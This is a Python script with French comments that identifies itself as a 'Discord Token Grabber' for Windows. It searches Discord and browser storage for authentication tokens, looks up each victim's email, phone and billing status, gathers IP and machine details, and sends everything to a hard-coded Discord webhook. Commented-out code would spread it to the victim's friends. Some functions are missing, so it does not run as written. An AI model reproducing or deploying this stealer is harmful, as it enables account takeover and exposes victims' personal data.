# Importation des modules nécessaires
import os
import sys
# import fonction

# Vérifier si le système d'exploitation est Windows
if os.name != "nt":
    exit()

# Importation des modules restants
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

# Définition des chemins pour différents programmes
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Opera GX": ROAMING + "\\Opera Software\\Opera GX Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

# Fonction pour obtenir les en-têtes de requête
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

# Fonction pour obtenir les données utilisateur à partir d'un token
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass

# Fonction pour obtenir les tokens dans un chemin spécifié
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

# Fonction pour obtenir le nom du développeur depuis un lien externe
# def getdeveloper():
#     dev = "wodx"
#     try:
#         dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
#     except:
#         pass
#     return dev

# Fonction pour obtenir l'adresse IP publique
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

# Fonction pour obtenir l'URL de l'avatar
# def getavatar(uid, aid):
#     url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
#     try:
#         urlopen(Request(url))
#     except:
#         url = url[:-4]
#     return url

# Fonction pour obtenir l'ID matériel (HWID) de la machine
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

# Fonction pour obtenir la liste des amis de l'utilisateur
# def getfriends(token):
#     try:
#         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
#     except:
#         pass

# Fonction pour obtenir l'ID du canal de chat avec un utilisateur spécifique
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass

# Vérifier si l'utilisateur a des méthodes de paiement associées à son compte
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass

# Fonction pour envoyer un message dans un canal spécifié
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass

# Fonction pour propager le malware (commentée pour désactivation)
# def spread(token, form_data, delay):
#     return
#     for friend in getfriends(token):
#         try:
#             chat_id = getchat(token, friend["id"])
#             send_message(token, chat_id, form_data)
#         except Exception as e:
#             pass
#         sleep(delay)

print("Affichage des informations des tokens...")

# Fonction principale du programme
def main():
    while True:
        # Chemin du fichier cache
        cache_path = ROAMING + "\\.cache~$"
        embeds = []
        working = []
        checked = []
        already_cached_tokens = []
        working_ids = []
        ip = getip()
        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")

        # Parcourir les chemins pour trouver les tokens
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in gettokens(path):
                if token in checked:
                    continue
                checked.append(token)
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in working_ids:
                        continue

                # Obtenir les données utilisateur pour le token
                user_data = getuserdata(token)
                if not user_data:
                    continue

                working_ids.append(uid)
                working.append(token)
                username = user_data["username"] + "#" + str(user_data["discriminator"])
                user_id = user_data["id"]
                avatar_id = user_data["avatar"]
                avatar_url = getavatar(user_id, avatar_id)
                email = user_data.get("email")
                phone = user_data.get("phone")
                nitro = bool(user_data.get("premium_type"))
                billing = bool(has_payment_methods(token))

                # Créer un objet embed pour le message
                embed = {
                    "color": 0x7289da,
                    "fields": [
                        {
                            "name": "**Account Info**",
                            "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                            "inline": True
                        },
                        {
                            "name": "**PC Info**",
                            "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                            "inline": True
                        },
                        {
                            "name": "**Token**",
                            "value": token,
                            "inline": False
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "icon_url": avatar_url
                    },
                    "footer": {
                        "text": f"Token Grabber",
                    }
                }
                embeds.append(embed)

        # Écrire les tokens vérifiés dans le fichier cache
        with open(cache_path, "a") as file:
            for token in checked:
                if not token in already_cached_tokens:
                    file.write(token + "\n")

        # S'il n'y a pas de tokens vérifiés, en ajouter un pour des raisons de démonstration
        if len(working) == 0:
            working.append('123')

        # Construire l'objet de message webhook
        webhook = {
            "content": "",
            "embeds": embeds,
            "username": "Discord Token Grabber",
            "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
        }

        # Envoyer le message webhook (URL du webhook à remplacer)
        try:
            urlopen(Request("https://discord.com/api/webhooks/1180966935777775776/UD_ncwm9k5a8co6X665Iujq7Bpkk2ttc9AfpRCGkM1l1sll60qEmYSVj-JXhBVEX-Yod", data=dumps(webhook).encode(), headers=getheaders()))
        except:
            pass

def print_menu():
    print("\n=== Discord Token Grabber ===")
    print("1. Afficher les informations des tokens")
    print("2. Quitter")
    print("=============================")

def menu_choice():
    choice = input("Entrez le numéro de votre choix: ")
    return choice


def run_menu():
    print("Début du programme.")
    while True:
        print_menu()
        choice = menu_choice()
        print("Choix saisi:", choice)

        if choice == "1":
            print("Option 1 sélectionnée.")
            display_token_info()
        elif choice == "2":
            print("Option 2 sélectionnée. Programme terminé. Au revoir!")
            sys.exit()
        else:
            print("Choix invalide. Veuillez réessayer.")
            print("Fin du programme.")

# Exécuter la fonction principale
try:
    run_menu()
except Exception as e:
    print("Erreur:", e)
    pass
